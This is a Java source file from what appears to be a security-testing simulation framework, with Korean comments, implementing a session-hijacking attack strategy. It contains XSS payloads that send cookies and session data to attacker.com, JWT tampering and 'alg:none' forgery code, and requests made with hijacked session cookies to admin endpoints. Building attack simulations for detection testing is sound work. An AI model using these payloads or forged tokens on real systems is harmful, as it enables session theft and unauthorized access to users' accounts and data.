package io.contexa.contexacore.simulation.strategy.impl;

import io.contexa.contexacore.domain.entity.AttackResult;
import io.contexa.contexacore.simulation.client.SimulationClient;
import io.contexa.contexacore.simulation.domain.LoginAttempt;
import io.contexa.contexacore.simulation.strategy.IAuthenticationAttack;
import io.contexa.contexacore.simulation.publisher.SimulationEventPublisher;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Component;

import java.time.LocalDateTime;
import java.util.*;
import java.util.concurrent.ThreadLocalRandom;

/**
 * 세션 하이재킹 공격 전략 구현
 * 
 * 세션 토큰 탈취, 조작, 재사용 등을 통한 인증 우회 공격을 시뮬레이션합니다.
 * 세션 고정, 세션 예측, 크로스 사이트 스크립팅(XSS)을 통한 쿠키 탈취 등을 포함합니다.
 * 
 * @author contexa
 * @since 1.0.0
 */
@Slf4j
@Component
public class SessionHijackingStrategy extends BaseAttackStrategy implements IAuthenticationAttack {

    private SimulationEventPublisher eventPublisher;

    @Override
    public void setEventPublisher(SimulationEventPublisher eventPublisher) {
        this.eventPublisher = eventPublisher;
    }

    private String generateRandomIp() {
        Random random = new Random();
        return String.format("%d.%d.%d.%d",
            random.nextInt(256),
            random.nextInt(256),
            random.nextInt(256),
            random.nextInt(256));
    }
    
    private SimulationClient simulationClient;
    
    public SessionHijackingStrategy() {
        // 기본 생성자
    }
    
    public SessionHijackingStrategy(SimulationClient simulationClient) {
        this.simulationClient = simulationClient;
    }
    
    @Value("${simulation.attack.session-hijacking.delay-ms:1000}")
    private int delayMs;
    
    @Value("${simulation.attack.session-hijacking.max-attempts:20}")
    private int maxAttempts;
    
    // 세션 하이재킹 기법
    private enum HijackingTechnique {
        SESSION_FIXATION,      // 세션 고정
        SESSION_PREDICTION,     // 세션 ID 예측
        COOKIE_THEFT,          // 쿠키 탈취 (XSS)
        MAN_IN_THE_MIDDLE,     // 중간자 공격
        TOKEN_MANIPULATION,     // 토큰 조작
        SESSION_REPLAY,        // 세션 재사용
        CROSS_SITE_SCRIPTING   // XSS를 통한 세션 탈취
    }
    
    @Override
    public AttackResult execute(AttackContext context) {
        log.warn("=== 세션 하이재킹 공격 시작 ===");
        
        AttackResult result = AttackResult.builder()
            .attackId(UUID.randomUUID().toString())
            .campaignId(context.getCampaignId())
            .type(AttackResult.AttackType.SESSION_HIJACKING)
            .attackName("Session Hijacking Attack")
            .executionTime(LocalDateTime.now())
            .targetUser(context.getTargetUser())
            .attackVector("session")
            .sourceIp(context.getSourceIp() != null ? context.getSourceIp() : generateRandomIp())
            .build();
        
        long startTime = System.currentTimeMillis();
        Map<String, Object> attackPayload = new HashMap<>();
        
        try {
            // 하이재킹 기법 선택
            HijackingTechnique technique = selectTechnique(context);
            log.info("선택된 하이재킹 기법: {}", technique);
            
            boolean success = false;
            String hijackedSession = null;
            
            switch (technique) {
                case SESSION_FIXATION:
                    hijackedSession = performSessionFixation(context);
                    break;
                    
                case SESSION_PREDICTION:
                    hijackedSession = performSessionPrediction(context);
                    break;
                    
                case COOKIE_THEFT:
                    hijackedSession = performCookieTheft(context);
                    break;
                    
                case MAN_IN_THE_MIDDLE:
                    hijackedSession = performManInTheMiddle(context);
                    break;
                    
                case TOKEN_MANIPULATION:
                    hijackedSession = performTokenManipulation(context);
                    break;
                    
                case SESSION_REPLAY:
                    hijackedSession = performSessionReplay(context);
                    break;
                    
                case CROSS_SITE_SCRIPTING:
                    hijackedSession = performXSSAttack(context);
                    break;
            }
            
            // 탈취한 세션으로 접근 시도
            String sourceIp = result.getSourceIp();

            if (hijackedSession != null) {
                success = attemptAccessWithHijackedSession(hijackedSession, context);

                if (success) {
                    log.error("!!! 세션 하이재킹 성공: session={}",
                        hijackedSession.substring(0, Math.min(10, hijackedSession.length())) + "...");

                    // 세션 하이재킹 성공 후 @Protectable로 보호된 고객 데이터 접근 시도
                    String targetCustomerId = "customer-" + ThreadLocalRandom.current().nextInt(1, 1000);
                    boolean dataBreached = attemptCustomerDataAccess(
                        targetCustomerId,
                        "SESSION_HIJACKING",
                        context
                    );

                    result.setAttackSuccessful(true);
                    result.setDataBreached(dataBreached);
                    result.setBreachedRecordCount(dataBreached ? 1 : 0);

                    // 세션 하이재킹 성공 이벤트 발행
                    if (eventPublisher != null) {
                        eventPublisher.publishAuthenticationSuccess(
                            result,
                            context.getTargetUser() != null ? context.getTargetUser() : "unknown_user",
                            sourceIp,
                            hijackedSession,
                            true, // anomalyDetected - 세션 하이재킹은 항상 이상 행위
                            0.1 // trustScore - 매우 낮은 신뢰도 (하이재킹된 세션)
                        );
                    }

                    // 세션 탈취 후 권한 상승 시도
                    attemptPrivilegeEscalation(hijackedSession);
                } else {
                    // 세션 하이재킹 실패 이벤트 발행
                    if (eventPublisher != null) {
                        eventPublisher.publishAuthenticationFailure(
                            result,
                            context.getTargetUser() != null ? context.getTargetUser() : "unknown_user",
                            sourceIp,
                            "Session hijacking attempt failed - " + technique.toString(),
                            1
                        );
                    }
                }
            } else {
                // 세션 탈취 자체가 실패한 경우
                if (eventPublisher != null) {
                    eventPublisher.publishAuthenticationFailure(
                        result,
                        context.getTargetUser() != null ? context.getTargetUser() : "unknown_user",
                        sourceIp,
                        "Session hijacking failed - unable to obtain session token using " + technique.toString(),
                        1
                    );
                }
            }
            
            result.setDuration(System.currentTimeMillis() - startTime);
            result.setAttackSuccessful(success);
            result.setSourceIp(sourceIp);
            
            // 공격 페이로드 기록
            attackPayload.put("technique", technique.toString());
            attackPayload.put("hijacked_session", hijackedSession != null ? 
                hijackedSession.substring(0, Math.min(20, hijackedSession.length())) + "..." : null);
            attackPayload.put("success", success);
            result.setAttackPayload(attackPayload);
            
            // 위험도 평가
            calculateRiskScore(result, technique, success);
            
        } catch (Exception e) {
            log.error("세션 하이재킹 공격 중 오류: {}", e.getMessage(), e);
            result.setFailureReason(e.getMessage());
        }
        
        log.warn("=== 세션 하이재킹 공격 종료: success={}, duration={}ms ===",
            result.isAttackSuccessful(), result.getDuration());
        
        return result;
    }
    
    /**
     * 세션 고정 공격
     */
    private String performSessionFixation(AttackContext context) {
        log.info("세션 고정 공격 시작");
        
        try {
            // 1. 공격자가 세션 ID 생성
            String fixedSessionId = generatePredictableSessionId();
            
            // 2. 피해자에게 세션 ID 전달 (피싱 링크 시뮬레이션)
            String phishingUrl = simulationClient.getBaseUrl() + 
                "/login?sessionid=" + fixedSessionId;
            log.debug("피싱 URL 생성: {}", phishingUrl);
            
            // 3. 피해자가 로그인 (시뮬레이션)
            simulateVictimLogin(context.getTargetUser(), fixedSessionId);
            
            // 4. 공격자가 고정된 세션 ID로 접근
            return fixedSessionId;
            
        } catch (Exception e) {
            log.error("세션 고정 공격 실패: {}", e.getMessage());
            return null;
        }
    }
    
    /**
     * 세션 ID 예측 공격
     */
    private String performSessionPrediction(AttackContext context) {
        log.info("세션 ID 예측 공격 시작");
        
        try {
            // 1. 여러 세션 ID 수집
            List<String> collectedSessions = collectSessionIds();
            
            // 2. 패턴 분석
            String pattern = analyzeSessionPattern(collectedSessions);
            
            // 3. 다음 세션 ID 예측
            String predictedSession = predictNextSessionId(pattern, collectedSessions);
            
            log.debug("예측된 세션 ID: {}", predictedSession);
            
            return predictedSession;
            
        } catch (Exception e) {
            log.error("세션 예측 공격 실패: {}", e.getMessage());
            return null;
        }
    }
    
    /**
     * 쿠키 탈취 (XSS 시뮬레이션)
     */
    private String performCookieTheft(AttackContext context) {
        log.info("쿠키 탈취 공격 시작 (XSS 시뮬레이션)");
        
        try {
            // 1. 정상 사용자 로그인 시뮬레이션
            simulateVictimLogin(context.getTargetUser(), null);
            
            // 2. XSS 페이로드 주입 시뮬레이션
            String xssPayload = "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>";
            log.debug("XSS 페이로드: {}", xssPayload);
            
            // 3. 쿠키 탈취 (시뮬레이션에서는 현재 세션 ID 반환)
            String stolenCookie = simulationClient.getCurrentSessionId();
            
            if (stolenCookie != null) {
                log.warn("쿠키 탈취 성공: JSESSIONID={}", 
                    stolenCookie.substring(0, Math.min(10, stolenCookie.length())) + "...");
            }
            
            return stolenCookie;
            
        } catch (Exception e) {
            log.error("쿠키 탈취 실패: {}", e.getMessage());
            return null;
        }
    }
    
    /**
     * 중간자 공격
     */
    private String performManInTheMiddle(AttackContext context) {
        log.info("중간자 공격 시작");
        
        try {
            // 1. 네트워크 트래픽 가로채기 시뮬레이션
            log.debug("네트워크 트래픽 모니터링 중...");
            Thread.sleep(1000);
            
            // 2. 세션 토큰 추출
            String interceptedToken = simulateTokenInterception();
            
            // 3. 토큰 재사용
            return interceptedToken;
            
        } catch (Exception e) {
            log.error("중간자 공격 실패: {}", e.getMessage());
            return null;
        }
    }
    
    /**
     * JWT 토큰 조작
     */
    private String performTokenManipulation(AttackContext context) {
        log.info("토큰 조작 공격 시작");
        
        try {
            // 1. 기존 JWT 토큰 획득
            String originalToken = obtainJwtToken(context.getTargetUser());
            
            if (originalToken == null || originalToken.isEmpty()) {
                return null;
            }
            
            // 2. JWT 디코딩
            String[] parts = originalToken.split("\\.");
            if (parts.length != 3) {
                log.warn("유효하지 않은 JWT 형식");
                return null;
            }
            
            // 3. 페이로드 조작
            String manipulatedToken = manipulateJwtPayload(parts);
            
            // 4. 알고리즘 혼동 공격 (Algorithm Confusion)
            String confusedToken = performAlgorithmConfusion(parts);
            
            return confusedToken != null ? confusedToken : manipulatedToken;
            
        } catch (Exception e) {
            log.error("토큰 조작 실패: {}", e.getMessage());
            return null;
        }
    }
    
    /**
     * 세션 재사용 공격
     */
    private String performSessionReplay(AttackContext context) {
        log.info("세션 재사용 공격 시작");
        
        try {
            // 1. 이전 세션 정보 수집
            String oldSession = context.getSessionId();
            
            if (oldSession == null) {
                // 정상 로그인으로 세션 획득
                simulateVictimLogin(context.getTargetUser(), null);
                oldSession = simulationClient.getCurrentSessionId();
            }
            
            // 2. 시간 경과 시뮬레이션
            Thread.sleep(5000);
            
            // 3. 만료된 세션 재사용 시도
            log.debug("만료된 세션 재사용 시도: {}", oldSession);
            
            return oldSession;
            
        } catch (Exception e) {
            log.error("세션 재사용 공격 실패: {}", e.getMessage());
            return null;
        }
    }
    
    /**
     * XSS 공격
     */
    private String performXSSAttack(AttackContext context) {
        log.info("XSS 공격 시작");
        
        // 다양한 XSS 페이로드
        List<String> xssPayloads = Arrays.asList(
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror='fetch(\"/api/session\").then(r=>r.text()).then(d=>fetch(\"http://attacker.com?data=\"+d))'>",
            "<svg onload='var x=new XMLHttpRequest();x.open(\"GET\",\"/api/user\");x.send();'>",
            "javascript:void(document.cookie='admin=true')"
        );
        
        // 페이로드 주입 시뮬레이션
        for (String payload : xssPayloads) {
            log.debug("XSS 페이로드 주입: {}", payload);
        }
        
        // 시뮬레이션에서는 현재 세션 반환
        return simulationClient.getCurrentSessionId();
    }
    
    /**
     * 하이재킹 기법 선택
     */
    private HijackingTechnique selectTechnique(AttackContext context) {
        String technique = context.getParameter("technique", String.class);
        
        if (technique != null) {
            try {
                return HijackingTechnique.valueOf(technique.toUpperCase());
            } catch (IllegalArgumentException e) {
                log.warn("알 수 없는 기법: {}, 기본값 사용", technique);
            }
        }
        
        // 랜덤 선택
        HijackingTechnique[] techniques = HijackingTechnique.values();
        return techniques[ThreadLocalRandom.current().nextInt(techniques.length)];
    }
    
    /**
     * 피해자 로그인 시뮬레이션
     */
    private void simulateVictimLogin(String username, String sessionId) {
        try {
            // 정상적인 로그인 시뮬레이션
            // 시뮬레이션용 로그인 - 취약한 비밀번호 패턴
            String weakPassword = generateWeakPassword(username);
            simulationClient.login(username, weakPassword);
            
            if (sessionId != null) {
                // 세션 고정인 경우 세션 ID 설정
                log.debug("세션 ID 고정: {}", sessionId);
            }
        } catch (Exception e) {
            log.debug("피해자 로그인 시뮬레이션 실패: {}", e.getMessage());
        }
    }
    
    /**
     * 세션 ID 수집
     */
    private List<String> collectSessionIds() {
        List<String> sessions = new ArrayList<>();
        
        for (int i = 0; i < 5; i++) {
            try {
                // 임시 로그인으로 세션 생성
                simulationClient.login("temp" + i, "password");
                String sessionId = simulationClient.getCurrentSessionId();
                if (sessionId != null) {
                    sessions.add(sessionId);
                }
                simulationClient.clearSession();
                Thread.sleep(100);
            } catch (Exception e) {
                log.debug("세션 수집 실패: {}", e.getMessage());
            }
        }
        
        return sessions;
    }
    
    /**
     * 세션 패턴 분석
     */
    private String analyzeSessionPattern(List<String> sessions) {
        // 간단한 패턴 분석 (실제로는 더 복잡한 분석 필요)
        if (sessions.isEmpty()) {
            return "random";
        }
        
        // 길이 체크
        int commonLength = sessions.get(0).length();
        boolean sameLength = sessions.stream().allMatch(s -> s.length() == commonLength);
        
        if (sameLength) {
            return "fixed-length-" + commonLength;
        }
        
        return "variable";
    }
    
    /**
     * 다음 세션 ID 예측
     */
    private String predictNextSessionId(String pattern, List<String> previousSessions) {
        if (previousSessions.isEmpty()) {
            return generateRandomSessionId();
        }
        
        // 간단한 예측 로직
        String lastSession = previousSessions.get(previousSessions.size() - 1);
        
        // 숫자 부분 증가 시도
        if (lastSession.matches(".*\\d+.*")) {
            return incrementNumericPart(lastSession);
        }
        
        // 타임스탬프 기반 예측
        return generateTimestampBasedSessionId();
    }
    
    /**
     * 예측 가능한 세션 ID 생성
     */
    private String generatePredictableSessionId() {
        // 취약한 세션 ID 생성 (시뮬레이션)
        long timestamp = System.currentTimeMillis() / 1000;
        return "SESS" + timestamp + ThreadLocalRandom.current().nextInt(1000);
    }
    
    /**
     * 랜덤 세션 ID 생성
     */
    private String generateRandomSessionId() {
        return UUID.randomUUID().toString().replace("-", "");
    }
    
    /**
     * 타임스탬프 기반 세션 ID
     */
    private String generateTimestampBasedSessionId() {
        return "TS" + System.currentTimeMillis() + ThreadLocalRandom.current().nextInt(100);
    }
    
    /**
     * 숫자 부분 증가
     */
    private String incrementNumericPart(String sessionId) {
        // 숫자 부분 찾아서 증가
        if (sessionId.matches(".*\\d+.*")) {
            // 마지막 숫자 부분 찾기
            int lastDigitIndex = -1;
            for (int i = sessionId.length() - 1; i >= 0; i--) {
                if (Character.isDigit(sessionId.charAt(i))) {
                    lastDigitIndex = i;
                    break;
                }
            }
            
            if (lastDigitIndex >= 0) {
                // 숫자 부분 추출
                int startIndex = lastDigitIndex;
                while (startIndex > 0 && Character.isDigit(sessionId.charAt(startIndex - 1))) {
                    startIndex--;
                }
                
                String prefix = sessionId.substring(0, startIndex);
                String numPart = sessionId.substring(startIndex, lastDigitIndex + 1);
                String suffix = sessionId.substring(lastDigitIndex + 1);
                
                try {
                    long num = Long.parseLong(numPart);
                    return prefix + (num + 1) + suffix;
                } catch (NumberFormatException e) {
                    return sessionId;
                }
            }
        }
        return sessionId;
    }
    
    /**
     * 토큰 가로채기 시뮬레이션
     */
    private String simulateTokenInterception() {
        // 실제로는 네트워크 스니핑 도구 사용
        return "intercepted-" + UUID.randomUUID().toString().substring(0, 16);
    }
    
    /**
     * JWT 토큰 획득
     */
    private String obtainJwtToken(String username) {
        try {
            // 정상 로그인으로 토큰 획득
            simulationClient.login(username, "password");
            return simulationClient.getCurrentAuthToken();
        } catch (Exception e) {
            // 시뮬레이션용 가짜 토큰
            return generateFakeJwtToken();
        }
    }
    
    /**
     * 실제 JWT 토큰 생성 (HMAC-SHA256 서명 포함)
     */
    private String generateFakeJwtToken() {
        String header = Base64.getEncoder().encodeToString("{\"alg\":\"HS256\",\"typ\":\"JWT\"}".getBytes());
        String payload = Base64.getEncoder().encodeToString(
            ("{\"sub\":\"admin\",\"exp\":" + (System.currentTimeMillis() / 1000 + 3600) + "}").getBytes()
        );

        // 실제 HMAC-SHA256 서명 생성
        String dataToSign = header + "." + payload;
        String signature = generateJWTSignature(dataToSign);

        return header + "." + payload + "." + signature;
    }

    /**
     * JWT HMAC-SHA256 서명 생성
     */
    private String generateJWTSignature(String data) {
        try {
            // 약한 시크릿 키 사용 (공격 시뮬레이션)
            // 시뮬레이션용 취약한 키 생성
            String secret = generateSessionSecret();
            javax.crypto.Mac mac = javax.crypto.Mac.getInstance("HmacSHA256");
            javax.crypto.spec.SecretKeySpec secretKeySpec = new javax.crypto.spec.SecretKeySpec(
                secret.getBytes("UTF-8"), "HmacSHA256"
            );
            mac.init(secretKeySpec);
            byte[] signatureBytes = mac.doFinal(data.getBytes("UTF-8"));
            return Base64.getUrlEncoder().withoutPadding().encodeToString(signatureBytes);
        } catch (Exception e) {
            log.error("JWT 서명 생성 실패: {}", e.getMessage());
            return "";
        }
    }
    
    /**
     * JWT 페이로드 조작
     */
    private String manipulateJwtPayload(String[] jwtParts) {
        try {
            // 페이로드 디코딩
            String payload = new String(Base64.getDecoder().decode(jwtParts[1]));
            
            // 권한 상승
            payload = payload.replace("\"role\":\"user\"", "\"role\":\"admin\"");
            payload = payload.replace("\"admin\":false", "\"admin\":true");
            
            // 재인코딩
            String newPayload = Base64.getEncoder().encodeToString(payload.getBytes());
            
            return jwtParts[0] + "." + newPayload + "." + jwtParts[2];
            
        } catch (Exception e) {
            log.error("JWT 조작 실패: {}", e.getMessage());
            return null;
        }
    }
    
    /**
     * JWT 알고리즘 혼동 공격
     */
    private String performAlgorithmConfusion(String[] jwtParts) {
        try {
            // 헤더를 none 알고리즘으로 변경
            String newHeader = Base64.getEncoder().encodeToString(
                "{\"alg\":\"none\",\"typ\":\"JWT\"}".getBytes()
            );
            
            // 서명 제거
            return newHeader + "." + jwtParts[1] + ".";
            
        } catch (Exception e) {
            log.error("알고리즘 혼동 공격 실패: {}", e.getMessage());
            return null;
        }
    }
    
    /**
     * 탈취한 세션으로 접근 시도
     */
    private boolean attemptAccessWithHijackedSession(String sessionId, AttackContext context) {
        try {
            // 탈취한 세션으로 요청
            Map<String, String> headers = new HashMap<>();
            headers.put("Cookie", "JSESSIONID=" + sessionId);
            
            ResponseEntity<String> response = simulationClient.get(
                "/api/user/profile", 
                null, 
                headers
            );
            
            boolean success = response.getStatusCode() == HttpStatus.OK;
            
            if (success) {
                log.warn("탈취한 세션으로 접근 성공!");
            }
            
            return success;
            
        } catch (Exception e) {
            log.debug("세션 접근 실패: {}", e.getMessage());
            return false;
        }
    }
    
    /**
     * 권한 상승 시도
     */
    private void attemptPrivilegeEscalation(String hijackedSession) {
        try {
            Map<String, String> headers = new HashMap<>();
            headers.put("Cookie", "JSESSIONID=" + hijackedSession);
            
            // 관리자 기능 접근 시도
            simulationClient.get("/api/admin/users", null, headers);
            simulationClient.post("/api/admin/settings", "{\"admin\":true}", headers);
            
            log.warn("세션 탈취 후 권한 상승 시도");
            
        } catch (Exception e) {
            log.debug("권한 상승 실패: {}", e.getMessage());
        }
    }
    
    /**
     * 위험도 계산
     */
    private void calculateRiskScore(AttackResult result, HijackingTechnique technique, boolean success) {
        double riskScore;
        
        if (success) {
            riskScore = 1.0; // 성공한 세션 하이재킹은 최고 위험
        } else if (technique == HijackingTechnique.TOKEN_MANIPULATION || 
                   technique == HijackingTechnique.MAN_IN_THE_MIDDLE) {
            riskScore = 0.8; // 고급 기법은 높은 위험
        } else {
            riskScore = 0.6;
        }
        
        result.setRiskScore(riskScore);
        result.setRiskLevel(AttackResult.RiskLevel.fromScore(riskScore).name());
        result.setImpactAssessment("Session compromise leading to unauthorized access");
    }
    
    // 인터페이스 구현 메서드들
    
    @Override
    public LoginAttempt attemptLogin(String username, String password) {
        // 세션 하이재킹은 직접 로그인 불필요
        return LoginAttempt.builder()
            .username(username)
            .successful(false)
            .failureReason("Session hijacking doesn't require login")
            .build();
    }
    
    @Override
    public List<LoginAttempt> attemptMultipleLogins(List<Credential> credentials) {
        // 세션 하이재킹은 여러 로그인 불필요
        return new ArrayList<>();
    }
    
    @Override
    public String manipulateSessionToken(String sessionToken) {
        // 토큰 조작 로직
        return performTokenManipulation(new AttackContext());
    }
    
    @Override
    public boolean attemptMfaBypass(String username, String mfaCode) {
        // 세션 하이재킹으로 MFA 우회
        return false; // 별도 전략 필요
    }
    
    @Override
    public int analyzePasswordComplexity(String password) {
        // 세션 하이재킹은 패스워드 분석 불필요
        return 0;
    }
    
    @Override
    public List<LoginAttempt> generateLoginPattern(LoginPatternType patternType) {
        // 세션 하이재킹은 로그인 패턴 불필요
        return new ArrayList<>();
    }
    
    @Override
    public AttackResult.AttackType getType() {
        return AttackResult.AttackType.SESSION_HIJACKING;
    }
    
    @Override
    public int getPriority() {
        return 80; // 높은 우선순위
    }
    
    @Override
    public AttackCategory getCategory() {
        return AttackCategory.SESSION;
    }
    
    @Override
    public boolean validateContext(AttackContext context) {
        // 세션 하이재킹은 특별한 컨텍스트 불필요
        return true;
    }
    
    @Override
    public long getEstimatedDuration() {
        return maxAttempts * delayMs;
    }
    
    @Override
    public String getDescription() {
        return "Session hijacking attack including fixation, prediction, and token manipulation";
    }
    
    @Override
    public RequiredPrivilege getRequiredPrivilege() {
        return RequiredPrivilege.NONE;
    }
    
    @Override
    public String getSuccessCriteria() {
        return "Successfully hijack and use victim's session";
    }

    private String generateWeakPassword(String username) {
        // 실제 공격에서 발견되는 약한 비밀번호 패턴 생성
        String[] patterns = {
            username + "123",
            username + "2024",
            "Welcome" + (username.hashCode() % 100),
            "Pass" + username.substring(0, Math.min(3, username.length())),
            username.toLowerCase() + "!",
            "Test" + (System.currentTimeMillis() % 1000)
        };
        return patterns[(int)((username.hashCode() & 0x7FFFFFFF) % patterns.length)];
    }

    private String generateSessionSecret() {
        // 실제 취약한 시스템에서 발견되는 세션 시크릿 패턴
        long time = System.currentTimeMillis();
        String[] secretPatterns = {
            "session_" + (time % 10000),
            "jwt_key_" + (time / 1000 % 1000),
            "hmac_" + System.nanoTime() % 10000,
            "auth_" + (time % 100000)
        };
        return secretPatterns[(int)(time % secretPatterns.length)];
    }
}